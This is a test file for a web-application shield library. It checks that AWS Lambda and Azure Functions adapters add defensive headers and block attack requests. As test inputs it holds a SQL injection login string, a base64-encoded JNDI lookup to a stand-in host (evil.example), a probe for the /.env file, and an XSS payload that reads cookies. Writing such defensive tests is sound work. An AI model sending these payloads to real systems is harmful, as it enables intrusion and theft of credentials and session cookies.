/*
 * 824 Shield — defense against AI-driven attacks.
 * Copyright (C) 2026 Nicholas Smith / 824
 *
 * This file is part of 824 Shield, free software licensed under the
 * GNU General Public License v3.0 (see the LICENSE file).
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { Shield } from '../src/index.js';
import { withShieldLambda } from '../adapters/aws-lambda.js';
import { withShieldAzure } from '../adapters/azure-functions.js';

const BROWSER = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36',
  'Accept': 'application/json',
  'Accept-Language': 'en-US,en;q=0.9',
  'Accept-Encoding': 'gzip, deflate, br',
  'Sec-Fetch-Site': 'same-origin',
};

const okHandler = async () => ({
  statusCode: 200,
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ ok: true }),
});

// --- AWS Lambda -------------------------------------------------------

test('lambda v1: normal request passes with defensive headers added', async () => {
  const handler = withShieldLambda(okHandler, new Shield());
  const res = await handler({
    httpMethod: 'GET', path: '/api/products', headers: { ...BROWSER },
    requestContext: { identity: { sourceIp: '203.0.113.10' } },
  }, {});
  assert.equal(res.statusCode, 200);
  assert.equal(res.headers['X-Frame-Options'], 'DENY');
  assert.equal(JSON.parse(res.body).ok, true);
});

test('lambda v1: SQL injection is blocked before the handler runs', async () => {
  let called = false;
  const handler = withShieldLambda(async () => { called = true; return okHandler(); }, new Shield());
  const res = await handler({
    httpMethod: 'POST', path: '/api/login',
    headers: { ...BROWSER, 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: "admin' OR 1=1 --", password: 'x' }),
    requestContext: { identity: { sourceIp: '198.51.100.7' } },
  }, {});
  assert.equal(res.statusCode, 403);
  assert.equal(called, false);
  assert.match(res.body, /Request blocked by 824 Shield/);
});

test('lambda v2: base64-encoded JNDI body is decoded and blocked', async () => {
  const handler = withShieldLambda(okHandler, new Shield());
  const res = await handler({
    version: '2.0',
    headers: { ...BROWSER, 'Content-Type': 'application/json' },
    body: Buffer.from(JSON.stringify({ name: '${jndi:ldap://evil.example/x}' }), 'utf8').toString('base64'),
    isBase64Encoded: true,
    requestContext: { http: { method: 'POST', path: '/api/chat', sourceIp: '198.51.100.8' } },
  }, {});
  assert.equal(res.statusCode, 403);
});

test('lambda v2: probe path is blocked', async () => {
  const handler = withShieldLambda(okHandler, new Shield());
  const res = await handler({
    version: '2.0', headers: { ...BROWSER },
    requestContext: { http: { method: 'GET', path: '/.env', sourceIp: '198.51.100.9' } },
  }, {});
  assert.equal(res.statusCode, 403);
});

// --- Azure Functions (v4 web-standard model) --------------------------

const azureOk = async () => new Response(JSON.stringify({ ok: true }), {
  headers: { 'Content-Type': 'application/json' },
});

test('azure: normal request passes with defensive headers added', async () => {
  const handler = withShieldAzure(azureOk, new Shield());
  const res = await handler(new Request('https://func.example/api/products', {
    headers: { ...BROWSER, 'x-forwarded-for': '203.0.113.10' },
  }), {});
  assert.equal(res.status, 200);
  assert.equal(res.headers.get('X-Frame-Options'), 'DENY');
});

test('azure: XSS payload is blocked before the handler runs', async () => {
  let called = false;
  const handler = withShieldAzure(async () => { called = true; return azureOk(); }, new Shield());
  const res = await handler(new Request('https://func.example/api/reviews', {
    method: 'POST',
    headers: { ...BROWSER, 'content-type': 'application/json', 'x-forwarded-for': '198.51.100.11' },
    body: JSON.stringify({ text: '<script>alert(document.cookie)</script>' }),
  }), {});
  assert.equal(res.status, 403);
  assert.equal(called, false);
});
